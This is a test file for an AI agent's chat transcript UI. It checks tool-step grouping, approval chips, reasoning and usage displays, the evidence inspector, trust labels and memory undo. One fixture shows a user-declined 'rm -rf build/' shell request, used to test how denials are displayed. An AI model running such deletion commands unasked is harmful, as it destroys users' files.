import { afterEach, describe, expect, it, vi } from "vitest";
import {
  cleanup,
  fireEvent,
  render,
  screen,
  waitFor,
} from "@testing-library/react";
import { Transcript } from "./Transcript";
import { humanizeTool } from "../humanize";
import type { Item } from "../types";
import type { ExecutionEvidence } from "../api";
import type { ModelCallStage } from "../types";

afterEach(cleanup);

// §33 TurnGroup: the user-message → final-answer span is ONE disclosure; interior assistant
// text is narration INSIDE it, the trailing assistant text is the answer OUTSIDE it; steps
// are humanized one-liners; approvals fold into their tool's row as a chip.
const TURN: Item[] = [
  { kind: "user", text: "post the digest" },
  { kind: "assistant", text: "Checking what merged since yesterday." },
  {
    kind: "tool",
    id: "t1",
    name: "read_file",
    args: { path: "docs/runbook.md" },
    status: "ok",
  },
  {
    kind: "approval",
    name: "send_message",
    args: { target: "slack:T1/C9" },
    reason: "",
    resolved: "once",
  },
  {
    kind: "tool",
    id: "t2",
    name: "send_message",
    args: { target: "slack:T1/C9", text: "hi" },
    status: "ok",
    preview: '{"ok": true}',
  },
  { kind: "assistant", text: "Posted to #all-openworker." },
];

describe("TurnGroup (Transcript §33)", () => {
  it("keeps hook order stable when restored history switches between HaaS and legacy projections", () => {
    const legacy: Item[] = [
      { kind: "user", text: "inspect the run" },
      {
        kind: "tool",
        id: "call_restore",
        name: "exec_command",
        args: {},
        status: "ok",
      },
      { kind: "assistant", text: "Done." },
    ];
    const haas: Item[] = [
      legacy[0],
      {
        ...legacy[1],
        source: "haas",
        activityKind: "command",
        safeSummary: "Run verification",
        commandPreview: "pytest -q",
      } as Item,
      {
        ...legacy[2],
        modelStages: [
          {
            modelCallId: "mcall_restore",
            status: "completed",
            steps: [
              {
                stepId: "call_restore",
                kind: "tool",
                activityId: "call_restore",
              },
            ],
          },
        ],
      } as Item,
    ];

    const view = render(<Transcript items={haas} onApprove={vi.fn()} />);
    expect(screen.getByText("pytest -q")).toBeTruthy();
    view.rerender(<Transcript items={legacy} onApprove={vi.fn()} />);
    expect(screen.getByText("Done.")).toBeTruthy();
    view.rerender(<Transcript items={haas} onApprove={vi.fn()} />);
    expect(screen.getByText("pytest -q")).toBeTruthy();
  });

  it("groups the whole turn; answer stays outside; narration and humanized steps inside", () => {
    const { container } = render(
      <Transcript items={TURN} onApprove={vi.fn()} />,
    );

    // Collapsed at rest: "2 steps", NO approval count, and no step/narration content visible.
    expect(screen.getByText("2 steps")).toBeTruthy();
    expect(screen.queryByText(/approval/)).toBeNull();
    expect(screen.queryByTestId("turn-narration")).toBeNull();
    expect(screen.queryByText(/Sent a Slack message/)).toBeNull();

    // The final answer is a normal bubble OUTSIDE the disclosure, visible while collapsed.
    expect(screen.getByText("Posted to #all-openworker.")).toBeTruthy();

    // Expand → narration renders quiet inside; steps are English lines, not raw args;
    // the approval is a chip on the send_message row, not a separate box.
    fireEvent.click(container.querySelector("summary.stepgroup-head")!);
    expect(screen.getByTestId("turn-narration").textContent).toContain(
      "Checking what merged",
    );
    expect(screen.getByText("runbook.md")).toBeTruthy();
    expect(screen.getByText(/Sent a Slack message to/)).toBeTruthy();
    expect(screen.getByText("✓ user-approved")).toBeTruthy();
    expect(screen.queryByText("send_message approval")).toBeNull();

    // Raw stays one click away: the row's raw toggle reveals args + result verbatim.
    fireEvent.click(screen.getAllByText("raw")[1]);
    expect(container.textContent).toContain('{"ok": true}');
  });

  it("a running turn is labeled Running but starts COLLAPSED (§33 ref #3)", () => {
    const items: Item[] = [
      { kind: "assistant", text: "Looking at the repo." },
      {
        kind: "tool",
        id: "t1",
        name: "grep",
        args: { pattern: "TODO" },
        status: "…",
      },
    ];
    const { container } = render(
      <Transcript items={items} onApprove={vi.fn()} />,
    );
    expect(screen.getByText(/Running 1 step…/)).toBeTruthy();
    expect(screen.queryByTestId("turn-narration")).toBeNull(); // collapsed by default
    expect(screen.getByTestId("turn-live-line").textContent).toContain(
      "Looking at the repo",
    );
    fireEvent.click(container.querySelector("summary.stepgroup-head")!);
    expect(screen.getByTestId("step-running")).toBeTruthy();
  });

  it("declined approvals keep their own 'Wanted to' row and surface on the collapsed line", () => {
    const items: Item[] = [
      {
        kind: "tool",
        id: "t1",
        name: "read_file",
        args: { path: "a.md" },
        status: "ok",
      },
      {
        kind: "approval",
        name: "run_shell",
        args: { command: "rm -rf build/" },
        reason: "",
        resolved: "deny",
      },
    ];
    const { container } = render(
      <Transcript items={items} onApprove={vi.fn()} />,
    );
    expect(screen.getByTestId("stepgroup-declined").textContent).toBe(
      "1 declined",
    );
    fireEvent.click(container.querySelector("summary.stepgroup-head")!);
    const ask = screen.getByTestId("turn-ask");
    expect(ask.textContent).toContain("Wanted to run");
    expect(ask.textContent).toContain("rm -rf build/");
    expect(ask.textContent).toContain("✕ declined");
  });

  it("assistant-only turns stay plain bubbles (no disclosure)", () => {
    const items: Item[] = [
      { kind: "user", text: "hi" },
      { kind: "assistant", text: "Hello there." },
    ];
    const { container } = render(
      <Transcript items={items} onApprove={vi.fn()} />,
    );
    expect(container.querySelector("details.stepgroup")).toBeNull();
    expect(screen.getByText("Hello there.")).toBeTruthy();
  });
});

describe("Codex-inspired activity experience (FV-20–FV-22)", () => {
  const HAAS_TURN: Item[] = [
    { kind: "user", text: "verify the release" },
    {
      kind: "tool",
      id: "call_1",
      name: "exec_command",
      args: {},
      source: "haas",
      activityKind: "command",
      safeSummary: "Run the focused test suite",
      status: "running",
      durationMs: 820,
      exitCode: 0,
      outputPreview: "24 passed\n1 warning",
    },
    { kind: "assistant", text: "The release checks passed." },
  ];
  const MODEL_STAGES: ModelCallStage[] = [
    {
      modelCallId: "mcall_0001",
      status: "completed",
      steps: [
        { stepId: "msg_1", kind: "commentary", text: "正在检查事件桥接。" },
        {
          stepId: "reason_1:0",
          kind: "reasoning_summary",
          text: "关联字段已经存在。",
        },
        { stepId: "call_1", kind: "tool", activityId: "call_1" },
        { stepId: "msg_2", kind: "result", text: "已定位问题。" },
      ],
      usage: {
        inputTokens: 8100,
        outputTokens: 746,
        reasoningOutputTokens: 214,
        cacheReadTokens: 3600,
        totalTokens: 8846,
      },
    },
  ];

  it("leads with the concrete command and keeps the generic category secondary", () => {
    const { container } = render(
      <Transcript
        items={[
          { kind: "user", text: "inspect the spec" },
          {
            kind: "tool",
            id: "call_specific",
            name: "exec_command",
            args: {},
            source: "haas",
            activityKind: "command",
            safeSummary: "Run command",
            status: "completed",
            commandPreview: "cat specs/event-log-sse/README.md",
          },
        ]}
        onApprove={vi.fn()}
      />,
    );

    const row = container.querySelector(".activity-row")!;
    expect(row.querySelector(".activity-row-title")?.textContent).toBe(
      "cat specs/event-log-sse/README.md",
    );
    expect(row.querySelector(".activity-row-summary")?.textContent).toBe(
      "Ran a command",
    );
  });

  it("renders commentary, reasoning, actions and results as distinct ordered steps with measured usage", () => {
    render(
      <Transcript
        items={HAAS_TURN.slice(0, 2)}
        onApprove={vi.fn()}
        running
        taskPhase="running"
        modelStages={MODEL_STAGES}
      />,
    );

    const stage = screen.getByTestId("model-call-stage");
    expect(stage.textContent).toContain("Stage 1");
    expect(stage.textContent).toContain("4 steps");
    expect(stage.textContent).toContain("↓ 8.1k");
    expect(stage.textContent).toContain("↑ 746");
    expect(stage.textContent).toContain("Reasoning 214");
    expect(stage.textContent).toContain("Cache 3.6k");
    expect(screen.getByText("Progress note")).toBeTruthy();
    expect(screen.getByText("Reasoning summary")).toBeTruthy();
    expect(screen.getByText("Action")).toBeTruthy();
    expect(screen.getByText("Stage result")).toBeTruthy();
    expect(screen.getAllByText("Included in stage 1").length).toBe(4);
  });

  it("renders a tool-free HaaS stage and does not duplicate its reasoning in the legacy panel", () => {
    render(
      <Transcript
        items={[{ kind: "user", text: "explain" }]}
        onApprove={vi.fn()}
        running
        reasoningText="legacy duplicate"
        modelStages={[
          {
            modelCallId: "mcall_0001",
            status: "running",
            steps: [
              {
                stepId: "reason_1:0",
                kind: "reasoning_summary",
                text: "Measured summary",
              },
            ],
          },
        ]}
      />,
    );

    expect(screen.getByTestId("model-call-stage")).toBeTruthy();
    expect(screen.getByText("Measured summary")).toBeTruthy();
    expect(screen.queryByText("legacy duplicate")).toBeNull();
  });

  it("keeps a reasoning row bounded and puts the complete provider summary in details", () => {
    const preview = "Inspecting the failing session and its event ordering.";
    const complete = `${preview} The later provider summary remains available as evidence.`;
    const { container } = render(
      <Transcript
        items={[{ kind: "user", text: "inspect" }]}
        onApprove={vi.fn()}
        running
        modelStages={[
          {
            modelCallId: "mcall_0001",
            status: "running",
            steps: [
              {
                stepId: "reason_1:0",
                kind: "reasoning_summary",
                previewText: preview,
                previewFrozen: true,
                text: complete,
              },
            ],
          },
        ]}
      />,
    );

    expect(screen.getByTestId("reasoning-preview").textContent).toBe(preview);
    const detail = screen.getByTestId("reasoning-detail") as HTMLDetailsElement;
    expect(detail.open).toBe(false);
    expect(detail.textContent).toContain(complete);
    expect(
      container.querySelector(".model-stage-reasoning-preview"),
    ).toBeTruthy();
  });

  it("defensively bounds an oversized or legacy reasoning preview", () => {
    const complete = "界".repeat(300);
    render(
      <Transcript
        items={[{ kind: "user", text: "inspect" }]}
        onApprove={vi.fn()}
        running
        modelStages={[
          {
            modelCallId: "mcall_0001",
            status: "running",
            steps: [
              {
                stepId: "reason_1:0",
                kind: "reasoning_summary",
                previewText: complete,
                text: complete,
              },
            ],
          },
        ]}
      />,
    );

    expect(screen.getByTestId("reasoning-preview").textContent).toHaveLength(
      240,
    );
    expect(screen.getByTestId("reasoning-detail").textContent).toContain(
      complete,
    );
  });

  it("shows an honest missing-usage state instead of fabricated zeros", () => {
    render(
      <Transcript
        items={HAAS_TURN.slice(0, 2)}
        onApprove={vi.fn()}
        running
        modelStages={[
          { ...MODEL_STAGES[0], status: "running", usage: undefined },
        ]}
      />,
    );
    expect(screen.getByText("Tokens not reported yet")).toBeTruthy();
    expect(screen.queryByText(/↓ 0/)).toBeNull();
  });

  it("keeps a user's completed-stage expansion across streaming rerenders", () => {
    const view = render(
      <Transcript
        items={HAAS_TURN.slice(0, 2)}
        onApprove={vi.fn()}
        running
        modelStages={MODEL_STAGES}
      />,
    );
    const summary = screen.getByText(/Stage 1/).closest("summary")!;
    fireEvent.click(summary);
    expect(screen.getByTestId("model-call-stage").hasAttribute("open")).toBe(
      true,
    );

    view.rerender(
      <Transcript
        items={HAAS_TURN.slice(0, 2)}
        onApprove={vi.fn()}
        running
        streamingText="next delta"
        modelStages={MODEL_STAGES}
      />,
    );
    expect(screen.getByTestId("model-call-stage").hasAttribute("open")).toBe(
      true,
    );
  });

  it("opens execution evidence from an action inside the model stage", () => {
    render(
      <Transcript
        items={HAAS_TURN.slice(0, 2)}
        onApprove={vi.fn()}
        running
        modelStages={[{ ...MODEL_STAGES[0], status: "running" }]}
      />,
    );

    fireEvent.click(
      screen.getByRole("button", { name: /Run the focused test suite/ }),
    );
    expect(screen.getByTestId("activity-inspector")).toBeTruthy();
    expect(screen.getByTestId("activity-inspector").textContent).toContain(
      "24 passed",
    );
  });

  it("shows live reasoning and semantic work together without machine fields", () => {
    render(
      <Transcript
        items={HAAS_TURN.slice(0, 2)}
        onApprove={vi.fn()}
        running
        taskPhase="running"
        reasoningText="Checking the package and focused tests."
      />,
    );

    expect(screen.getByTestId("activity-stream")).toBeTruthy();
    expect(
      screen.getByText("Checking the package and focused tests."),
    ).toBeTruthy();
    expect(screen.getByText("Ran a command")).toBeTruthy();
    expect(screen.getByText("Run the focused test suite")).toBeTruthy();
    expect(screen.queryByText(/exec_command|summary=/)).toBeNull();
  });

  it("shows the concrete action, bounded key result, and status before details are opened", () => {
    const items: Item[] = [
      { kind: "user", text: "run the verification" },
      {
        kind: "tool",
        id: "call_first_screen",
        name: "exec_command",
        args: {},
        source: "haas",
        activityKind: "command",
        safeSummary: "Run command",
        commandPreview: "pytest tests/test_release.py -q",
        status: "completed",
        outputPreview: "24 passed\n1 warning\nfull diagnostic detail",
        omittedLineCount: 7,
        exitCode: 0,
        durationMs: 820,
      },
    ];

    render(
      <Transcript items={items} onApprove={vi.fn()} taskPhase="completed" />,
    );

    const row = screen.getByRole("button", {
      name: /pytest tests\/test_release.py -q/,
    });
    expect(row.textContent).toContain("24 passed");
    expect(row.textContent).toContain("1 warning");
    expect(row.textContent).not.toContain("full diagnostic detail");
    expect(row.textContent).toContain("Succeeded");
    expect(row.textContent).toContain("exit 0");
    expect(screen.queryByTestId("activity-inspector")).toBeNull();
  });

  it("collapses a completed turn to a result summary and expands semantic activity", () => {
    const completedTurn = HAAS_TURN.map((item) =>
      item.kind === "tool" ? { ...item, status: "completed" as const } : item,
    );
    render(
      <Transcript
        items={completedTurn}
        onApprove={vi.fn()}
        taskPhase="completed"
        modelStages={MODEL_STAGES}
      />,
    );

    expect(screen.getByText("Completed · 1 activity")).toBeTruthy();
    expect(screen.getByText("The release checks passed.")).toBeTruthy();
    expect(screen.getByText("Run the focused test suite")).toBeTruthy();
    expect(screen.getByText(/24 passed\s+1 warning/)).toBeTruthy();
    expect(screen.queryByTestId("model-stage-list")).toBeNull();
    fireEvent.click(screen.getByRole("button", { name: "Show activity" }));
    expect(screen.getByTestId("model-stage-list")).toBeTruthy();
  });

  it("opens a read-only activity inspector with bounded details", () => {
    render(
      <Transcript
        items={HAAS_TURN}
        onApprove={vi.fn()}
        taskPhase="completed"
      />,
    );
    fireEvent.click(screen.getByRole("button", { name: "Show activity" }));
    fireEvent.click(screen.getByRole("button", { name: /Ran a command/ }));

    const inspector = screen.getByTestId("activity-inspector");
    expect(inspector.textContent).toContain("Run the focused test suite");
    expect(inspector.textContent).toContain("Exit code");
    expect(inspector.textContent).toContain("0");
    expect(inspector.textContent).toContain("820 ms");
    expect(inspector.textContent).toContain("24 passed");
    expect(screen.queryByText("raw")).toBeNull();
  });

  it("shows the command fact and loads complete short-lived execution evidence", async () => {
    const ordinaryUrl = "https://docs.example.com/runbook?section=release";
    const authorizationUrl =
      "https://login.example.com/oauth/authorize?client_id=abc&redirect_uri=https%3A%2F%2Flocalhost%2Fcallback&state=signed-state&sig=abc123";
    const command = `curl '${authorizationUrl}' && open '${ordinaryUrl}'`;
    const evidence: ExecutionEvidence = {
      evidenceRef: "evd_1",
      sessionId: "hsess_1",
      invocationId: "inv_1",
      toolCallId: "call_1",
      command,
      workingDirectory: "/workspace/project",
      output: `Open ${ordinaryUrl}\nAuthorize at ${authorizationUrl}`,
      outputStream: "combined",
      links: [
        { url: ordinaryUrl, kind: "ordinary", expiresAtMs: null },
        {
          url: authorizationUrl,
          kind: "authorization",
          expiresAtMs: 1_900_000_000_000,
        },
      ],
      expiresAtMs: 1_900_000_000_000,
    };
    const loadExecutionEvidence = vi.fn().mockResolvedValue(evidence);
    const items: Item[] = [
      { kind: "user", text: "authorize the CLI" },
      {
        kind: "tool",
        id: "call_1",
        name: "exec_command",
        args: {},
        source: "haas",
        activityKind: "command",
        safeSummary: "Start CLI authorization",
        status: "completed",
        commandPreview: "acme auth login --browser",
        workingDirectory: "/workspace/project",
        invocationId: "inv_1",
        evidenceRef: "evd_1",
        evidenceExpiresAtMs: 1_900_000_000_000,
      },
      { kind: "assistant", text: "Authorization is waiting in the browser." },
    ];

    render(
      <Transcript
        items={items}
        onApprove={vi.fn()}
        taskPhase="completed"
        loadExecutionEvidence={loadExecutionEvidence}
      />,
    );
    fireEvent.click(screen.getByRole("button", { name: "Show activity" }));
    expect(screen.getByText("acme auth login --browser")).toBeTruthy();
    fireEvent.click(screen.getByRole("button", { name: /Ran a command/ }));

    await waitFor(() =>
      expect(loadExecutionEvidence).toHaveBeenCalledWith(
        "inv_1",
        "call_1",
        "evd_1",
      ),
    );
    const inspector = screen.getByTestId("activity-inspector");
    expect(inspector.textContent).toContain(command);
    expect(inspector.textContent).toContain("/workspace/project");
    expect(inspector.textContent).toContain(
      "Open https://docs.example.com/runbook",
    );
    for (const url of [ordinaryUrl, authorizationUrl]) {
      const links = screen.getAllByRole("link", { name: url });
      expect(links.length).toBeGreaterThan(0);
      for (const link of links) {
        expect(link.getAttribute("href")).toBe(url);
        expect(link.getAttribute("target")).toBe("_blank");
        expect(link.getAttribute("rel")).toContain("noopener");
        expect(link.getAttribute("rel")).toContain("noreferrer");
        expect(link.getAttribute("referrerpolicy")).toBe("no-referrer");
      }
    }
  });

  it("explains when short-lived execution evidence has expired", async () => {
    const loadExecutionEvidence = vi
      .fn()
      .mockRejectedValue(
        Object.assign(new Error("expired"), {
          status: 410,
          code: "haas_execution_evidence_expired",
        }),
      );
    const items: Item[] = [
      { kind: "user", text: "run it" },
      {
        kind: "tool",
        id: "call_expired",
        name: "exec_command",
        args: {},
        source: "haas",
        activityKind: "command",
        safeSummary: "Run the command",
        status: "failed",
        commandPreview: "make verify",
        invocationId: "inv_expired",
        evidenceRef: "evd_expired",
      },
    ];
    render(
      <Transcript
        items={items}
        onApprove={vi.fn()}
        loadExecutionEvidence={loadExecutionEvidence}
      />,
    );
    fireEvent.click(screen.getByRole("button", { name: /Ran a command/ }));
    expect(await screen.findByText("Execution evidence expired")).toBeTruthy();
  });

  it("moves focus for keyboard selection and restores it on Escape", async () => {
    render(
      <Transcript
        items={HAAS_TURN}
        onApprove={vi.fn()}
        taskPhase="completed"
      />,
    );
    fireEvent.click(screen.getByRole("button", { name: "Show activity" }));
    const row = screen.getByRole("button", { name: /Ran a command/ });
    row.focus();
    fireEvent.click(row, { detail: 0 });
    await waitFor(() =>
      expect(document.activeElement?.textContent).toBe("Ran a command"),
    );
    fireEvent.keyDown(screen.getByTestId("activity-inspector"), {
      key: "Escape",
    });
    await waitFor(() => expect(document.activeElement).toBe(row));
  });

  it("closes from Escape after pointer selection without stealing row focus", async () => {
    render(
      <Transcript
        items={HAAS_TURN}
        onApprove={vi.fn()}
        taskPhase="completed"
      />,
    );
    fireEvent.click(screen.getByRole("button", { name: "Show activity" }));
    const row = screen.getByRole("button", { name: /Ran a command/ });
    row.focus();
    fireEvent.click(row, { detail: 1 });
    expect(document.activeElement).toBe(row);
    fireEvent.keyDown(document, { key: "Escape" });
    await waitFor(() =>
      expect(screen.queryByTestId("activity-inspector")).toBeNull(),
    );
    expect(document.activeElement).toBe(row);
  });

  it("keeps the saved reasoning summary available after completion", () => {
    const items: Item[] = [
      HAAS_TURN[0],
      HAAS_TURN[1],
      {
        kind: "assistant",
        text: "The release checks passed.",
        reasoning: "Checked package metadata and tests.",
      },
    ];
    render(
      <Transcript items={items} onApprove={vi.fn()} taskPhase="completed" />,
    );
    expect(
      screen.queryByText("Checked package metadata and tests."),
    ).toBeNull();
    fireEvent.click(screen.getByRole("button", { name: "Show activity" }));
    expect(
      screen.getByText("Checked package metadata and tests."),
    ).toBeTruthy();
  });

  it.each([
    ["failed", "Failed · 1 activity"],
    ["incomplete", "Incomplete · 1 activity"],
    ["cancelled", "Cancelled · 1 activity"],
    ["verifying", "Verifying · 1 activity"],
  ])("never labels a %s task as completed", (phase, label) => {
    render(
      <Transcript
        items={HAAS_TURN}
        onApprove={vi.fn()}
        taskPhase={phase}
        taskOutcome={{
          phase,
          code: "provider_failed",
          safeReason: "Provider unavailable",
        }}
      />,
    );
    expect(screen.getByText(label)).toBeTruthy();
    expect(screen.queryByText("Completed · 1 activity")).toBeNull();
    if (phase !== "verifying") {
      expect(screen.getByTestId("activity-task-error").textContent).toContain(
        "Provider unavailable",
      );
    }
  });

  it("offers retry only when the structured HaaS outcome permits it", () => {
    const onRetry = vi.fn();
    const { rerender } = render(
      <Transcript
        items={HAAS_TURN}
        onApprove={vi.fn()}
        onRetry={onRetry}
        taskPhase="failed"
        taskOutcome={{
          phase: "failed",
          safeReason: "Provider unavailable",
          retryable: false,
        }}
      />,
    );
    expect(screen.queryByRole("button", { name: "Retry" })).toBeNull();
    rerender(
      <Transcript
        items={HAAS_TURN}
        onApprove={vi.fn()}
        onRetry={onRetry}
        taskPhase="failed"
        taskOutcome={{
          phase: "failed",
          safeReason: "Provider unavailable",
          retryable: true,
        }}
      />,
    );
    fireEvent.click(screen.getByRole("button", { name: "Retry" }));
    expect(onRetry).toHaveBeenCalledOnce();
  });

  it("keeps historical turn outcomes and one shared Inspector owner", () => {
    const items: Item[] = [
      { kind: "user", text: "first" },
      {
        kind: "tool",
        id: "old",
        name: "haas_activity",
        args: {},
        source: "haas",
        activityKind: "command",
        safeSummary: "First attempt",
        status: "failed",
        safeReason: "Command failed",
        taskOutcome: { phase: "failed", safeReason: "Command failed" },
      },
      { kind: "assistant", text: "First result", source: "haas" },
      { kind: "user", text: "second" },
      {
        kind: "tool",
        id: "new",
        name: "haas_activity",
        args: {},
        source: "haas",
        activityKind: "read",
        safeSummary: "Read config",
        status: "completed",
        taskOutcome: { phase: "completed" },
      },
      { kind: "assistant", text: "Second result", source: "haas" },
    ];
    render(
      <Transcript items={items} onApprove={vi.fn()} taskPhase="completed" />,
    );

    expect(screen.getByText("Failed · 1 activity")).toBeTruthy();
    expect(screen.getByText("Completed · 1 activity")).toBeTruthy();
    fireEvent.click(screen.getByRole("button", { name: /Ran a command/ }));
    expect(screen.getAllByTestId("activity-inspector")).toHaveLength(1);
    fireEvent.click(screen.getByRole("button", { name: "Show activity" }));
    fireEvent.click(screen.getByRole("button", { name: /Read files/ }));
    expect(screen.getAllByTestId("activity-inspector")).toHaveLength(1);
    expect(screen.getByTestId("activity-inspector").textContent).toContain(
      "Read config",
    );
  });
});

// OPE-136: two DIFFERENT standing sources can waive an MCP card, and the chip must
// name the right one — a user's own trust rule was being described as the server's
// mcp.json flag (owner-hit 2026-08-30).
describe("origin chips — standing MCP trust names its source", () => {
  const toolWith = (origin: string): Item[] => [
    { kind: "user", text: "search jira" },
    {
      kind: "tool",
      id: "t1",
      name: "mcp__jira__search",
      args: { jql: "x" },
      status: "ok",
      approvalOrigin: origin,
    },
  ];
  const chipFor = (origin: string) => {
    const { container } = render(
      <Transcript items={toolWith(origin)} onApprove={vi.fn()} />,
    );
    fireEvent.click(container.querySelector("summary.stepgroup-head")!);
    const chip = screen.getByTestId("tool-approval-origin");
    return { text: chip.textContent, title: chip.getAttribute("title") };
  };

  it("a user trust rule says so, and points at the tool page to revoke", () => {
    const chip = chipFor("trusted_rule");
    expect(chip.text).toBe("allowed by your trust rule");
    expect(chip.title).toContain("Always allow this tool");
    expect(chip.title).toContain("Connectors page");
  });

  it("the legacy server flag keeps the server-trust label pointing at mcp.json", () => {
    cleanup();
    const chip = chipFor("trusted_server");
    expect(chip.text).toBe("allowed by server trust");
    expect(chip.title).toContain("mcp.json");
  });

  it("pre-split transcripts (origin 'trusted') fall back to a generic honest label", () => {
    cleanup();
    const chip = chipFor("trusted");
    expect(chip.text).toBe("allowed by standing trust");
    expect(chip.title).not.toContain("mcp.json"); // never claims the wrong source
  });

  it("a run-grant covered call says so, and names the expiry", () => {
    // OPE-136 "Allow for this request": covered calls run cardless but never
    // invisible — the chip names the user's own in-run click as the source.
    cleanup();
    const chip = chipFor("run_grant");
    expect(chip.text).toBe("allowed for this request");
    expect(chip.title).toContain("Allow for this request");
    expect(chip.title).toContain("expired when the answer finished");
  });
});

describe("live turns (§33 flicker fix)", () => {
  const LIVE: Item[] = [
    { kind: "user", text: "build the app" },
    {
      kind: "tool",
      id: "t1",
      name: "read_file",
      args: { path: "data.json" },
      status: "ok",
    },
    { kind: "assistant", text: "Inspecting the fetched dataset next." },
  ];

  it("while running, trailing assistant text stays INSIDE the group — no answer bubble flash", () => {
    const { container } = render(
      <Transcript items={LIVE} onApprove={vi.fn()} running />,
    );
    // No assistant bubble anywhere; the group starts COLLAPSED with the narration riding
    // the header as the live line (§33 ref #3 — expanding is opt-in).
    expect(container.querySelector(".bubble-assistant")).toBeNull();
    expect(screen.queryByTestId("turn-narration")).toBeNull();
    expect(screen.getByTestId("turn-live-line").textContent).toContain(
      "Inspecting the fetched dataset",
    );
    // Expanding shows it as the quiet line inside.
    fireEvent.click(container.querySelector("summary.stepgroup-head")!);
    expect(screen.getByTestId("turn-narration").textContent).toContain(
      "Inspecting the fetched dataset",
    );
    // Once the turn ends (running=false), the same trailing text IS the answer bubble.
    cleanup();
    const done = render(<Transcript items={LIVE} onApprove={vi.fn()} />);
    expect(
      done.container.querySelector(".bubble-assistant")?.textContent,
    ).toContain("Inspecting the fetched dataset");
  });

  it("quiet streamed text rides the collapsed header and the expanded body — never floats", () => {
    const { container } = render(
      <Transcript
        items={LIVE}
        onApprove={vi.fn()}
        running
        streamingText="The quote endpoint rate-limited, so I'm checking the historical pages."
      />,
    );
    // Collapsed: the STREAMING text wins the header live line (fresher than the last item).
    expect(screen.getByTestId("turn-live-line").textContent).toContain(
      "quote endpoint rate-limited",
    );
    expect(container.querySelector(".bubble-assistant")).toBeNull();
    // Expanded: it renders as the small quiet line under the steps.
    fireEvent.click(container.querySelector("summary.stepgroup-head")!);
    expect(screen.getByTestId("turn-live-stream").textContent).toContain(
      "quote endpoint rate-limited",
    );
  });

  it("a PENDING approval neither splits the turn nor promotes the narration", () => {
    const items: Item[] = [
      ...LIVE,
      {
        kind: "approval",
        name: "write_file",
        args: { path: "app.html" },
        reason: "",
      }, // unresolved
    ];
    const { container } = render(
      <Transcript items={items} onApprove={vi.fn()} running />,
    );
    expect(container.querySelectorAll("details.stepgroup")).toHaveLength(1);
    expect(container.querySelector(".bubble-assistant")).toBeNull();
  });

  it("a live run with NO tool activity is a plain streaming reply — bubbles as ever", () => {
    const items: Item[] = [
      { kind: "user", text: "hi" },
      { kind: "assistant", text: "Hello!" },
    ];
    const { container } = render(
      <Transcript items={items} onApprove={vi.fn()} running />,
    );
    expect(container.querySelector("details.stepgroup")).toBeNull();
    expect(container.querySelector(".bubble-assistant")?.textContent).toContain(
      "Hello!",
    );
  });
});

describe("bubble hover affordances (FB-005)", () => {
  const TS = 1752969720; // unix seconds, as the server stamps them
  const ITEMS: Item[] = [
    { kind: "user", text: "post the digest", ts: TS },
    { kind: "assistant", text: "Done — posted to #all-openworker." }, // pre-stamp history: no ts
  ];

  it("copy button copies the bubble's raw text and flashes Copied", async () => {
    const writeText = vi.fn().mockResolvedValue(undefined);
    Object.defineProperty(navigator, "clipboard", {
      value: { writeText },
      configurable: true,
    });
    render(<Transcript items={ITEMS} onApprove={vi.fn()} />);

    const copies = screen.getAllByTestId("bubble-copy");
    expect(copies).toHaveLength(2); // user + assistant bubbles both get one
    fireEvent.click(copies[0]);
    expect(writeText).toHaveBeenCalledWith("post the digest");
    // "Copied" lands only after the clipboard write RESOLVES (a rejected write must
    // not claim success), hence the await.
    await waitFor(() => expect(copies[0].textContent).toBe("Copied"));
    fireEvent.click(copies[1]);
    expect(writeText).toHaveBeenCalledWith("Done — posted to #all-openworker.");
  });

  it("timestamp renders only when the item carries ts; full date rides the title", () => {
    render(<Transcript items={ITEMS} onApprove={vi.fn()} />);

    const stamps = screen.getAllByTestId("bubble-ts");
    expect(stamps).toHaveLength(1); // the ts-less assistant bubble shows none
    const when = new Date(TS * 1000);
    expect(stamps[0].textContent).toBe(
      when.toLocaleTimeString([], { hour: "numeric", minute: "2-digit" }),
    );
    expect(stamps[0].getAttribute("title")).toBe(when.toLocaleString());
  });
});

// MEMORY-SPEC §5.1 — the save notice lives IN the conversation (a corner toast vanished
// before it could be read or undone, owner-hit 2026-07-28) and stays until acted on.
describe("memory save notice", () => {
  it("announces the save inline and offers Undo", () => {
    const onUndo = vi.fn();
    render(
      <Transcript
        items={[{ kind: "memory", id: 7, text: "prefers short replies" }]}
        onApprove={vi.fn()}
        onUndoMemory={onUndo}
      />,
    );
    const notice = screen.getByTestId("memory-notice");
    expect(notice.textContent).toContain("I'll remember that");
    expect(notice.textContent).toContain("prefers short replies");

    fireEvent.click(screen.getByTestId("memory-notice-undo"));
    // No `previous` on a brand-new save — undo deletes it outright.
    expect(onUndo).toHaveBeenCalledWith(7, undefined);
  });

  it("says an existing memory was UPDATED and undoes by restoring its old text", () => {
    const onUndo = vi.fn();
    render(
      <Transcript
        items={[
          {
            kind: "memory",
            id: 4,
            text: "diabetic, lactose-free, likes ice cream",
            previous: "diabetic, lactose-free",
          },
        ]}
        onApprove={vi.fn()}
        onUndoMemory={onUndo}
      />,
    );
    expect(screen.getByTestId("memory-notice").textContent).toContain(
      "I've updated what I remember",
    );
    fireEvent.click(screen.getByTestId("memory-notice-undo"));
    // Undo restores the previous wording rather than deleting the whole memory.
    expect(onUndo).toHaveBeenCalledWith(4, "diabetic, lactose-free");
  });

  it("confirms in place once undone, with no Undo left to click", () => {
    render(
      <Transcript
        items={[
          {
            kind: "memory",
            id: 7,
            text: "prefers short replies",
            undone: true,
          },
        ]}
        onApprove={vi.fn()}
        onUndoMemory={vi.fn()}
      />,
    );
    expect(screen.getByTestId("memory-notice-undone").textContent).toContain(
      "forgotten",
    );
    expect(screen.queryByTestId("memory-notice-undo")).toBeNull();
  });
});

describe("humanizeTool", () => {
  it("prefers run_shell's model-written description and keeps the command as the object", () => {
    const line = humanizeTool("run_shell", {
      command: "git log --since=yesterday",
      description: "List yesterday's merges",
    });
    expect(line.pre).toBe("Ran ");
    expect(line.obj).toBe("git log --since=yesterday");
    expect(line.post).toContain("list yesterday's merges");
  });

  it("falls back to 'Used <tool> — <short args>' for unknown tools", () => {
    const line = humanizeTool("gmail_search_messages", { query: "from:ci" });
    expect(line.pre).toBe("Used gmail_search_messages");
    expect(line.post).toContain("query=from:ci");
  });

  it("summarizes todo_write by its single item and status", () => {
    const line = humanizeTool("todo_write", {
      todos: [{ content: "Post the digest", status: "in_progress" }],
    });
    expect(line.pre).toBe("Updated the plan — ");
    expect(line.obj).toContain("Post the digest");
    expect(line.post).toBe(" → in progress");
  });

  it("still renders pre-rename todo_write histories (legacy `items` key)", () => {
    const line = humanizeTool("todo_write", {
      items: [{ content: "Old plan", status: "pending" }],
    });
